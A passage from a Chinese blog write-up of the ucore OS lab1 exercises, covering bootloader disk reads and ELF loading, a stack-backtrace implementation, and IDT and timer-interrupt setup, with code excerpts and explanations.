ELF文件0x1000位置后面的0xd1ec比特被载入内存0x00100000</span></span><br><span class="line">           <span class="comment">// ELF文件0xf000位置后面的0x1d20比特被载入内存0x0010e000</span></span><br><span class="line">   <span class="number">104</span></span><br><span class="line">   <span class="number">105</span>      <span class="comment">// 根据ELF头部储存的入口信息，找到内核的入口</span></span><br><span class="line">   <span class="number">106</span>      <span class="comment">//注意：不返回 --死循环</span></span><br><span class="line">   <span class="number">107</span>      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="number">0xFFFFFF</span>))();</span><br><span class="line">   <span class="number">108</span></span><br><span class="line">   <span class="number">109</span>  bad:</span><br><span class="line">   <span class="number">110</span>      outw(<span class="number">0x8A00</span>, <span class="number">0x8A00</span>);</span><br><span class="line">   <span class="number">111</span>      outw(<span class="number">0x8A00</span>, <span class="number">0x8E00</span>);</span><br><span class="line">   <span class="number">112</span></span><br><span class="line">   <span class="number">113</span>      <span class="comment">/* do nothing */</span></span><br><span class="line">   <span class="number">114</span>      <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">   <span class="number">115</span>  &#125;</span><br><span class="line">   <span class="number">116</span></span><br></pre></td></tr></table></figure></div>
<h2 id="练习4-1"><a href="#练习4-1" class="headerlink" title="练习4.1"></a>练习4.1</h2><p>bootloader如何读取硬盘扇区的？</p>
<p>读取扇区代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="number">36</span>  <span class="comment">/* waitdisk-等待磁盘就绪 */</span></span><br><span class="line"><span class="number">37</span>  <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line"><span class="number">38</span>  waitdisk(<span class="keyword">void</span>) &#123;</span><br><span class="line"><span class="number">39</span>      <span class="keyword">while</span> ((inb(<span class="number">0x1F7</span>) &amp; <span class="number">0xC0</span>) != <span class="number">0x40</span>)</span><br><span class="line"><span class="number">40</span>          <span class="comment">/* do nothing */</span>;</span><br><span class="line"><span class="number">41</span>  &#125;</span><br><span class="line"><span class="number">42</span></span><br><span class="line"><span class="number">43</span>  <span class="comment">/* readsect-将@secno的单个扇区读入@dst */</span></span><br><span class="line"><span class="number">44</span>  <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line"><span class="number">45</span>  readsect(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno) &#123;</span><br><span class="line"><span class="number">46</span>      <span class="comment">//等待磁盘准备好</span></span><br><span class="line"><span class="number">47</span>      waitdisk();</span><br><span class="line"><span class="number">48</span></span><br><span class="line"><span class="number">49</span>      outb(<span class="number">0x1F2</span>, <span class="number">1</span>);                         <span class="comment">// count = 1</span></span><br><span class="line"><span class="number">50</span>      outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="number">51</span>      outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="number">52</span>      outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="number">53</span>      outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);</span><br><span class="line"><span class="number">54</span>      outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);                      <span class="comment">// cmd 0x20 - read 读取扇区</span></span><br><span class="line"><span class="number">55</span></span><br><span class="line"><span class="number">56</span>      <span class="comment">//等待磁盘准备好</span></span><br><span class="line"><span class="number">57</span>      waitdisk();</span><br><span class="line"><span class="number">58</span></span><br><span class="line"><span class="number">59</span>      <span class="comment">//读一个扇区</span></span><br><span class="line"><span class="number">60</span>      insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</span><br><span class="line"><span class="number">61</span>  &#125;</span><br></pre></td></tr></table></figure></div>
<p>磁盘IO各个端口作用</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>IO地址</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x1f0</td>
<td>读数据，当0x1f7不为忙状态时，可以读。</td>
</tr>
<tr>
<td>0x1f2</td>
<td>要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区</td>
</tr>
<tr>
<td>0x1f3</td>
<td>如果是LBA模式，就是LBA参数的0-7位</td>
</tr>
<tr>
<td>0x1f4</td>
<td>如果是LBA模式，就是LBA参数的8-15位</td>
</tr>
<tr>
<td>0x1f5</td>
<td>如果是LBA模式，就是LBA参数的16-23位</td>
</tr>
<tr>
<td>0x1f6</td>
<td>第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘</td>
</tr>
<tr>
<td>0x1f7</td>
<td>状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据</td>
</tr>
</tbody>
</table>
</div>
<ol>
<li>待硬盘空闲。waitdisk的函数实现只有一行：<code>while ((inb(0x1F7) &amp; 0xC0) != 0x40)</code>，0xC0=1100 0000 b，0x40=0100 0000b，意思是不断查询读0x1F7寄存器的最高两位，直到最高位为0、次高位为1（这个状态应该意味着磁盘空闲）才返回。</li>
<li>硬盘空闲后，发出读取扇区的命令。对应的命令字为0x20，放在0x1F7寄存器中；读取的扇区数为1，放在0x1F2寄存器中；读取的扇区起始编号共28位，分成4部分依次放在0x1F3~0x1F6寄存器中。</li>
<li>发出命令后，再次等待硬盘空闲。</li>
<li>硬盘再次空闲后，开始从0x1F0寄存器中读数据。注意insl的作用是”That function will read cnt dwords from the input port specified by port into the supplied output array addr.”，是以dword即4字节为单位的，因此这里SECTIZE需要除以4</li>
</ol>
<p>bootblock.asm中的insl函数定义</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*包含3个输入参数，port代表端口号，addr代表这个扇区存放在主存中的起始地址，cnt则代表读取的次数*&#x2F;</span><br><span class="line">212  static inline void</span><br><span class="line">213  insl(uint32_t port, void *addr, int cnt) &#123;</span><br><span class="line">214      asm volatile (</span><br><span class="line">215      7cc1:       b9 80 00 00 00          mov    $0x80,%ecx</span><br><span class="line">216      7cc6:       ba f0 01 00 00          mov    $0x1f0,%edx</span><br><span class="line">217      7ccb:       fc                      cld</span><br><span class="line">218      7ccc:       f2 6d                   repnz insl (%dx),%es:(%edi)</span><br><span class="line">219      &#x2F;&#x2F; wait for disk to be ready</span><br><span class="line">220      waitdisk();</span><br><span class="line">221</span><br><span class="line">222      &#x2F;&#x2F; read a sector</span><br><span class="line">223      insl(0x1F0, dst, SECTSIZE &#x2F; 4);</span><br><span class="line">224  &#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="练习4-2"><a href="#练习4-2" class="headerlink" title="练习4.2"></a>练习4.2</h2><p>bootloader是如何加载ELF格式的OS？</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"> <span class="number">85</span>  <span class="comment">/* bootmain-引导加载程序的条目*/</span></span><br><span class="line"> <span class="number">86</span>  <span class="keyword">void</span></span><br><span class="line"> <span class="number">87</span>  bootmain(<span class="keyword">void</span>) &#123;</span><br><span class="line"> <span class="number">88</span>      <span class="comment">// 首先读取ELF的头部</span></span><br><span class="line"> <span class="number">89</span>      readseg((<span class="keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"> <span class="number">90</span></span><br><span class="line"> <span class="number">91</span>       <span class="comment">// 通过储存在头部的幻数判断是否是合法的ELF文件</span></span><br><span class="line"> <span class="number">92</span>      <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;</span><br><span class="line"> <span class="number">93</span>          <span class="keyword">goto</span> bad;</span><br><span class="line"> <span class="number">94</span>      &#125;</span><br><span class="line"> <span class="number">95</span></span><br><span class="line"> <span class="number">96</span>      <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"> <span class="number">97</span></span><br><span class="line"> <span class="number">98</span>      <span class="comment">// ELF头部有描述ELF文件应加载到内存什么位置的描述表, 先将描述表的头地址存在ph</span></span><br><span class="line"> <span class="number">99</span>      ph = (struct proghdr *)((<span class="keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line"><span class="number">100</span>      eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">         <span class="comment">// 按照描述表将ELF文件中数据载入内存</span></span><br><span class="line"><span class="number">101</span>      <span class="keyword">for</span> (; ph &lt; eph; ph ++) &#123;</span><br><span class="line"><span class="number">102</span>          readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line"><span class="number">103</span>      &#125;</span><br><span class="line">        <span class="comment">// ELF文件0x1000位置后面的0xd1ec比特被载入内存0x00100000</span></span><br><span class="line">        <span class="comment">// ELF文件0xf000位置后面的0x1d20比特被载入内存0x0010e000</span></span><br><span class="line"><span class="number">104</span></span><br><span class="line"><span class="number">105</span>      <span class="comment">// 根据ELF头部储存的入口信息，找到内核的入口</span></span><br><span class="line"><span class="number">106</span>      <span class="comment">//注意：不返回 --死循环</span></span><br><span class="line"><span class="number">107</span>      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="number">0xFFFFFF</span>))();</span><br><span class="line"><span class="number">108</span></span><br><span class="line"><span class="number">109</span>  bad:</span><br><span class="line"><span class="number">110</span>      outw(<span class="number">0x8A00</span>, <span class="number">0x8A00</span>);</span><br><span class="line"><span class="number">111</span>      outw(<span class="number">0x8A00</span>, <span class="number">0x8E00</span>);</span><br><span class="line"><span class="number">112</span></span><br><span class="line"><span class="number">113</span>      <span class="comment">/* do nothing */</span></span><br><span class="line"><span class="number">114</span>      <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line"><span class="number">115</span>  &#125;</span><br><span class="line"><span class="number">116</span></span><br></pre></td></tr></table></figure></div>
<h1 id="练习5：实现函数调用堆栈跟踪函数"><a href="#练习5：实现函数调用堆栈跟踪函数" class="headerlink" title="练习5：实现函数调用堆栈跟踪函数"></a>练习5：实现函数调用堆栈跟踪函数</h1><p>我们需要在lab1中完成kdebug.c中函数print_stackframe的实现，可以通过函数print_stackframe来跟踪函数调用堆栈中记录的返回地址。在如果能够正确实现此函数，可在lab1中执行 “make qemu”后，在qemu模拟器中得到类似如下的输出：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">ebp:0x00007b28 eip:0x00100992 args:0x00010094 0x00010094 0x00007b58 0x00100096</span><br><span class="line">    kern&#x2F;debug&#x2F;kdebug.c:305: print_stackframe+22</span><br><span class="line">ebp:0x00007b38 eip:0x00100c79 args:0x00000000 0x00000000 0x00000000 0x00007ba8</span><br><span class="line">    kern&#x2F;debug&#x2F;kmonitor.c:125: mon_backtrace+10</span><br><span class="line">ebp:0x00007b58 eip:0x00100096 args:0x00000000 0x00007b80 0xffff0000 0x00007b84</span><br><span class="line">    kern&#x2F;init&#x2F;init.c:48: grade_backtrace2+33</span><br><span class="line">ebp:0x00007b78 eip:0x001000bf args:0x00000000 0xffff0000 0x00007ba4 0x00000029</span><br><span class="line">    kern&#x2F;init&#x2F;init.c:53: grade_backtrace1+38</span><br><span class="line">ebp:0x00007b98 eip:0x001000dd args:0x00000000 0x00100000 0xffff0000 0x0000001d</span><br><span class="line">    kern&#x2F;init&#x2F;init.c:58: grade_backtrace0+23</span><br><span class="line">ebp:0x00007bb8 eip:0x00100102 args:0x0010353c 0x00103520 0x00001308 0x00000000</span><br><span class="line">    kern&#x2F;init&#x2F;init.c:63: grade_backtrace+34</span><br><span class="line">ebp:0x00007be8 eip:0x00100059 args:0x00000000 0x00000000 0x00000000 0x00007c53</span><br><span class="line">    kern&#x2F;init&#x2F;init.c:28: kern_init+88</span><br><span class="line">ebp:0x00007bf8 eip:0x00007d73 args:0xc031fcfa 0xc08ed88e 0x64e4d08e 0xfa7502a8</span><br><span class="line">&lt;unknow&gt;: -- 0x00007d72 –</span><br><span class="line">……</span><br></pre></td></tr></table></figure></div>
<p>请完成实验，看看输出是否与上述显示大致一致，并解释最后一行各个数值的含义。</p>
<p>提示：可阅读小节“函数堆栈”，了解编译器如何建立函数调用关系的。在完成lab1编译后，查看lab1/obj/bootblock.asm，了解bootloader源码与机器码的语句和地址等的对应关系；查看lab1/obj/kernel.asm，了解 ucore OS源码与机器码的语句和地址等的对应关系。</p>
<p>要求完成函数kern/debug/kdebug.c::print_stackframe的实现，提交改进后源代码包（可以编译执行），并在实验报告中简要说明实现过程，并写出对上述问题的回答。</p>
<p>当运行make qemu得到如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">moocos-&gt; make qemu</span><br><span class="line">(THU.CST) os is loading ...</span><br><span class="line"></span><br><span class="line">Special kernel symbols:</span><br><span class="line">  entry  0x00100000 (phys)</span><br><span class="line">  etext  0x00103209 (phys)</span><br><span class="line">  edata  0x0010da16 (phys)</span><br><span class="line">  end    0x0010ed20 (phys)</span><br><span class="line">Kernel executable memory footprint: 60KB</span><br><span class="line">++ setup timer interrupts</span><br></pre></td></tr></table></figure></div>
<p><a href="#bootblock.asm的代码">bootblock.asm源码</a></p>
<p>查看kern/debug/kdebug.c::print_stackframe</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/OXh1cc4.png" alt="image-20200311151416667"></p>
<p>按照注释来做</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">print_stackframe(<span class="keyword">void</span>) &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> ebp =read_ebp(), eip = read_eip();</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; ebp != <span class="number">0</span> &amp;&amp; i &lt; STACKFRAME_DEPTH; i ++)&#123;</span><br><span class="line">                cprintf(<span class="string">"ebp:0x%08x eip:0x%08x "</span>, ebp, eip);</span><br><span class="line">                <span class="keyword">uint32_t</span> *args = (<span class="keyword">uint32_t</span> *)ebp + <span class="number">2</span>;</span><br><span class="line">                cprintf(<span class="string">"args: 0x%08x 0x%08x 0x%08x 0x%08x"</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>], args[<span class="number">3</span>]);</span><br><span class="line">                cprintf(<span class="string">"\n"</span>);</span><br><span class="line">                print_debuginfo(eip - <span class="number">1</span>);</span><br><span class="line">                eip = ((<span class="keyword">uint32_t</span> *)ebp)[<span class="number">1</span>];</span><br><span class="line">                ebp = ((<span class="keyword">uint32_t</span> *)ebp)[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>中cprintf表示控制台(console)输出</p>
<p>重新make qemu后</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/MUGvbo9.png" alt="image-20200311154602152"></p>
<p>最后一行是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ebp:0x00007bf8 eip:0x00007d68 args: 0xc031fcfa 0xc08ed88e 0x64e4d08e 0xfa7502a8</span><br></pre></td></tr></table></figure></div>
<p>共有ebp，eip和args三类参数</p>
<p><strong>函数调用栈</strong></p>
<p>函数开头</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">pushl   %ebp</span><br><span class="line">movl   %esp , %ebp</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/WGeprui.png" alt="函数调用栈"></p>
<p>这两条汇编指令的含义是：首先将ebp寄存器入栈，然后将栈顶指针esp赋值给ebp。“mov ebp esp”这条指令表面上看是用esp覆盖ebp原来的值，其实不然。因为给ebp赋值之前，原ebp值已经被压栈（位于栈顶），而新的ebp又恰恰指向栈顶。此时ebp寄存器就已经处于一个非常重要的地位，该寄存器中存储着栈中的一个地址（原ebp入栈后的栈顶），从该地址为基准，向上（栈底方向）能获取返回地址、参数值，向下（栈顶方向）能获取函数局部变量值，而该地址处又存储着上一层函数调用时的ebp值。</p>
<p>一般而言，EBP 基址指针，是保存调用者函数的地址，总是指向函数栈栈底，ESP被调函数的指针，总是指向函数栈栈顶。ss:[ebp+4]处为返回地址，ss:[ebp+8]处为第一个参数值（最后一个入栈的参数值，此处假设其占用4字节内存），ss:[ebp-4]处为第一个局部变量，ss:[ebp]处为上一层ebp值。</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/fyyMdC8.png" alt="image-20200311170344228"></p>
<p>最后一行输出的ebp为<code>0x00007bf8</code>，eip为<code>0x00007d68</code>，这是因为bootloader被加载到了0x00007c00地址处，在执行到 <a href="#bootasm.S 源码">bootasm.S</a>  最后”call bootmain”指令时，首先将返回地址压栈，再将当前ebp压栈，所以此时esp为0x00007bf8。ss:ebp+4指向caller调用时的eip在bootmain函数入口处，有mov %esp %ebp指令，故bootmain中ebp为0x00007bf8。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">289      7cfc:       75 6a                   jne    7d68 &lt;bootmain+0x97&gt;</span><br><span class="line">394      7d68:       b8 00 8a ff ff          mov    $0xffff8a00,%eax</span><br></pre></td></tr></table></figure></div>
<p>ss:ebp+4指向caller调用时的eip，可以看到其地址。</p>
<p>一般来说，args存放的4个dword是对应4个输入参数的值。但这里比较特殊，由于bootmain函数调用时并没传递任何输入参数，并且栈顶的位置恰好在bootloader第一条指令存放的地址的上面，而args恰好是ebp寄存器指向的栈顶往上第2~5个单元，因此args存放的就是bootloader指令的前16个字节。可以对比obj/bootblock.asm文件来验证(其字节序为小端字节序)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">14      7c00:       fa                      cli</span><br><span class="line">16      7c01:       fc                      cld</span><br><span class="line">20      7c02:       31 c0                   xor    %eax,%eax</span><br><span class="line">22      7c04:       8e d8                   mov    %eax,%ds</span><br><span class="line">24      7c06:       8e c0                   mov    %eax,%es</span><br><span class="line">26      7c08:       8e d0                   mov    %eax,%ss</span><br><span class="line">35      7c0a:       e4 64                   in     $0x64,%al</span><br><span class="line">37      7c0c:       a8 02                   test   $0x2,%al</span><br><span class="line">39      7c0e:       75 fa                   jne    7c0a &lt;seta20.1&gt;</span><br></pre></td></tr></table></figure></div>
<h1 id="练习6：完善中断初始化和处理"><a href="#练习6：完善中断初始化和处理" class="headerlink" title="练习6：完善中断初始化和处理"></a>练习6：完善中断初始化和处理</h1><p>请完成编码工作和回答如下问题：</p>
<ol>
<li>中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</li>
<li>请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。</li>
<li>请编程完善trap.c中的中断处理函数trap，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</li>
</ol>
<blockquote>
<p>【注意】除了系统调用中断(T_SYSCALL)使用陷阱门描述符且权限为用户态权限以外，其它中断均使用特权级(DPL)为０的中断门描述符，权限为内核态权限；而ucore的应用程序处于特权级３，需要采用｀int 0x80`指令操作（这种方式称为软中断，软件中断，Tra中断，在lab5会碰到）来发出系统调用请求，并要能实现从特权级３到特权级０的转换，所以系统调用中断(T_SYSCALL)所对应的中断门描述符中的特权级（DPL）需要设置为３。</p>
</blockquote>
<p>要求完成问题2和问题3 提出的相关函数实现，提交改进后的源代码包（可以编译执行），并在实验报告中简要说明实现过程，并写出对问题1的回答。完成这问题2和3要求的部分代码后，运行整个系统，可以看到大约每1秒会输出一次”100 ticks”，而按下的键也会在屏幕上显示。</p>
<h2 id="练习6-1"><a href="#练习6-1" class="headerlink" title="练习6.1"></a>练习6.1</h2><p>中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</p>
<p>中断向量表一个表项占用8字节，其中2-3字节是段选择子，0-1字节和6-7字节拼成位移，<br>两者联合便是中断处理程序的入口地址。</p>
<h2 id="练习6-2"><a href="#练习6-2" class="headerlink" title="练习6.2"></a>练习6.2</h2><p>kern/trap/trap.c的片段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="number">34</span>  <span class="comment">/* idt_init - initialize IDT to each of the entry points in kern/trap/vectors.S */</span></span><br><span class="line"><span class="number">35</span>  <span class="keyword">void</span></span><br><span class="line"><span class="number">36</span>  idt_init(<span class="keyword">void</span>) &#123;</span><br><span class="line"><span class="number">37</span>       <span class="comment">/* LAB1 YOUR CODE : STEP 2 */</span></span><br><span class="line"><span class="number">38</span>       <span class="comment">/* (1) Where are the entry addrs of each Interrupt Service Routine (ISR)?</span></span><br><span class="line"><span class="comment">39        *     All ISR's entry addrs are stored in __vectors. where is uintptr_t __vectors[] ?</span></span><br><span class="line"><span class="comment">40        *     __vectors[] is in kern/trap/vector.S which is produced by tools/vector.c</span></span><br><span class="line"><span class="comment">41        *     (try "make" command in lab1, then you will find vector.S in kern/trap DIR)</span></span><br><span class="line"><span class="comment">42        *     You can use  "extern uintptr_t __vectors[];" to define this extern variable which will be used later.</span></span><br><span class="line"><span class="comment">43        * (2) Now you should setup the entries of ISR in Interrupt Description Table (IDT).</span></span><br><span class="line"><span class="comment">44        *     Can you see idt[256] in this file? Yes, it's IDT! you can use SETGATE macro to setup each item of IDT</span></span><br><span class="line"><span class="comment">45        * (3) After setup the contents of IDT, you will let CPU know where is the IDT by using 'lidt' instruction.</span></span><br><span class="line"><span class="comment">46        *     You don't know the meaning of this instruction? just google it! and check the libs/x86.h to know more.</span></span><br><span class="line"><span class="comment">47        *     Notice: the argument of lidt is idt_pd. try to find it!</span></span><br><span class="line"><span class="comment">48        */</span></span><br><span class="line"><span class="number">49</span>  &#125;</span><br></pre></td></tr></table></figure></div>
<p>kern/mm/mmu.h中的SETGATE宏</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="number">71</span>  <span class="meta">#<span class="meta-keyword">define</span> SETGATE(gate, istrap, sel, off, dpl) &#123;            \</span></span><br><span class="line"><span class="number">72</span>      (gate).gd_off_15_0 = (<span class="keyword">uint32_t</span>)(off) &amp; <span class="number">0xffff</span>;        \</span><br><span class="line"><span class="number">73</span>      (gate).gd_ss = (sel);                                \</span><br><span class="line"><span class="number">74</span>      (gate).gd_args = <span class="number">0</span>;                                    \</span><br><span class="line"><span class="number">75</span>      (gate).gd_rsv1 = <span class="number">0</span>;                                    \</span><br><span class="line"><span class="number">76</span>      (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32;    \</span><br><span class="line"><span class="number">77</span>      (gate).gd_s = <span class="number">0</span>;                                    \</span><br><span class="line"><span class="number">78</span>      (gate).gd_dpl = (dpl);                                \</span><br><span class="line"><span class="number">79</span>      (gate).gd_p = <span class="number">1</span>;                                    \</span><br><span class="line"><span class="number">80</span>      (gate).gd_off_31_16 = (<span class="keyword">uint32_t</span>)(off) &gt;&gt; <span class="number">16</span>;        \</span><br><span class="line"><span class="number">81</span>  &#125;</span><br></pre></td></tr></table></figure></div>
<p>补全函数如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;  i &lt; <span class="number">256</span>; i ++)&#123;</span><br><span class="line">        SETGATE(idt[i], <span class="number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);</span><br><span class="line">&#125;</span><br><span class="line">SETGATE(idt[T_SWITCH_TOK], <span class="number">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);</span><br><span class="line">lidt(&amp;idt_pd);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 传入的第一个参数gate是中断的描述符表</span></span><br><span class="line"><span class="comment"> 传入的第二个参数istrap用来判断是中断还是trap</span></span><br><span class="line"><span class="comment"> 传入的第三个参数sel的作用是进行段的选择</span></span><br><span class="line"><span class="comment"> 传入的第四个参数off表示偏移</span></span><br><span class="line"><span class="comment"> 传入的第五个参数dpl表示这个中断的优先级</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>
<h2 id="练习6-3"><a href="#练习6-3" class="headerlink" title="练习6.3"></a>练习6.3</h2><p>请编程完善trap.c中的中断处理函数trap，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</p>
<p>提示片段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* LAB1 YOUR CODE : STEP 3 */</span></span><br><span class="line"><span class="comment">/* handle the timer interrupt */</span></span><br><span class="line"><span class="comment">/* (1) After a timer interrupt, you should record this event using a global variable (increase it), such as ticks in kern/driver/clock.c</span></span><br><span class="line"><span class="comment"> * (2) Every TICK_NUM cycle, you can print some info using a funciton, such as print_ticks().</span></span><br><span class="line"><span class="comment"> * (3) Too Simple? Yes, I think so!</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></div>
<p>补充如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">ticks++;</span><br><span class="line"><span class="keyword">if</span>(ticks%TICK_NUM == <span class="number">0</span>)<span class="comment">//每次时钟中断之后ticks就会加一 当加到TICK_NUM次数时 打印并重新开始</span></span><br><span class="line">print_ticks();<span class="comment">//前面有定义 打印字符串</span></span><br></pre></td></tr></table></figure></div>
<p>运行make qemu显示如下</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/CazTG2S.png" alt="image-20200311180818859"></p>
<h1 id="扩展练习-Challenge-1"><a href="#扩展练习-Challenge-1" class="headerlink" title="扩展练习 Challenge 1"></a>扩展练习 Challenge 1</h1><p>扩展proj4,增加syscall功能，即增加一用户态函数（可执行一特定系统调用：获得时钟计数值），当内核初始完毕后，可从内核态返回到用户态的函数，而用户态的函数又通过系统调用得到内核态的服务。</p>
<p>提示： 规范一下 challenge 的流程。</p>
<p>kern_init 调用 switch_test，该函数如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">switch_test(void) &#123;</span><br><span class="line">    print_cur_status();          &#x2F;&#x2F; print 当前 cs&#x2F;ss&#x2F;ds 等寄存器状态</span><br><span class="line">    cprintf(&quot;+++ switch to  user  mode +++\n&quot;);</span><br><span class="line">    switch_to_user();            &#x2F;&#x2F; switch to user mode</span><br><span class="line">    print_cur_status();</span><br><span class="line">    cprintf(&quot;+++ switch to kernel mode +++\n&quot;);</span><br><span class="line">    switch_to_kernel();         &#x2F;&#x2F; switch to kernel mode</span><br><span class="line">    print_cur_status();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>switchto函数建议通过 中断处理的方式实现。主要要完成的代码是在 trap 里面处理 T_SWITCH_TO* 中断，并设置好返回的状态。</p>
<p>在 lab1 里面完成代码以后，执行 make grade 应该能够评测结果是否正确。</p>
<font face="黑体" color="black" size="6.5">Solution:</font>

